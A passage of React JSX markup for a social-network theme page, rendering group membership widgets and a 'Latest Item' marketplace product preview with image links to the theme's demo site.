                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="group-timeline.html">Street Artists</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">951 members</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request decline">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-leave-group">
                              <use xlinkHref="#svg-leave-group" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="group-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-border">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-40-44" data-src="https://odindesignthemes.com/vikinger/img/avatar/27.jpg" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="group-timeline.html">Gaming Watchtower</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">2.365 members</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request accept">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-join-group">
                              <use xlinkHref="#svg-join-group" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                    </div>
                    {/* /USER STATUS LIST */}
                  </div>
                  {/* WIDGET BOX CONTENT */}
                </div>
                {/* /WIDGET BOX */}
                {/* WIDGET BOX */}
                <div className="widget-box">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">Latest Item</p>
                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content">
                    {/* PRODUCT PREVIEW */}
                    <div className="product-preview small">
                      {/* PRODUCT PREVIEW IMAGE */}
                      <a href="marketplace-product.html">
                        <figure className="product-preview-image liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/marketplace/items/01.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/marketplace/items/01.jpg" alt="item-01" style={{"display":"none"}} />
                        </figure>
                      </a>
                      {/* /PRODUCT PREVIEW IMAGE */}
                      {/* PRODUCT PREVIEW INFO */}
                      <div className="product-preview-info">
                        {/* TEXT STICKER */}
                        <p className="text-sticker"><span className="highlighted">$</span> 12.00</p>
                        {/* /TEXT STICKER */}
                        {/* PRODUCT PREVIEW TITLE */}
                        <p className="product-preview-title"><a href="marketplace-product.html">Twitch Stream UI Pack</a></p>
                        {/* /PRODUCT PREVIEW TITLE */}
                        {/* PRODUCT PREVIEW CATEGORY */}
                        <p className="product-preview-category digital"><a href="marketplace-category.html">Stream Packs</a></p>
                        {/* /PRODUCT PREVIEW CATEGORY */}
                      </div>
                      {/* /PRODUCT PREVIEW INFO */}
                    </div>
                    {/* /PRODUCT PREVIEW */}
                  </div>
                  {/* /WIDGET BOX CONTENT */}
                </div>
                {/* /WIDGET BOX */}
              </div>
              {/* /GRID COLUMN */}
            </div>
            {/* /GRID */}
        </div>
        <FootMeta />
        </>: <PageLoader />
    )
    }
}
